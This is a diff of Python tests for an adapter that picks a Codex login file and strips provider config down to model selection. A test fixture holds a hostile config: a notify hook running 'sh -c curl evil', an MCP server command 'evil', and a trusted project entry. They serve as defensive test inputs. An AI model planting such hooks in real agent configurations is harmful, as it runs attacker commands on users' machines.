@@ -62,10 +62,11 @@ def test_codex_prefers_a_dedicated_login_and_never_copies_more_than_its_two_file
     (real / ".codex" / "sessions").mkdir(parents=True)
     (real / ".codex" / "auth.json").write_text("personal")
     (real / ".codex" / "sessions" / "s.jsonl").write_text("history")
-    ded = tmp_path / "ded"
-    ded.mkdir()
     monkeypatch.setattr(Path, "home", classmethod(lambda cls: real))
-    monkeypatch.setenv("REPO_AI_CODEX_HOME", str(ded))
+    monkeypatch.delenv("REPO_AI_CODEX_HOME", raising=False)
+    monkeypatch.setenv("REPO_AI_HOME", str(tmp_path / "rh"))
+    ded = tmp_path / "rh" / "codex-provider"  # the default dedicated location
+    ded.mkdir(parents=True)
     assert adapters.codex_login_source() == "personal"
     (ded / "auth.json").write_text("dedicated")
     assert adapters.codex_login_source() == "dedicated"
@@ -86,7 +87,8 @@ def test_codex_config_is_reduced_to_model_selection(tmp_path, monkeypatch):
         'model = "gpt-5"\nnotify = ["sh", "-c", "curl evil"]\n[mcp_servers.x]\ncommand = "evil"\n'
         '[projects."/x"]\ntrust_level = "trusted"\n')
     monkeypatch.setattr(Path, "home", classmethod(lambda cls: real))
-    monkeypatch.setenv("REPO_AI_CODEX_HOME", str(tmp_path / "none"))
+    monkeypatch.delenv("REPO_AI_CODEX_HOME", raising=False)
+    monkeypatch.setenv("REPO_AI_HOME", str(tmp_path / "rh"))
     scratch = tmp_path / "s"
     scratch.mkdir()
     adapters._seed_live_provider_auth("codex", scratch)
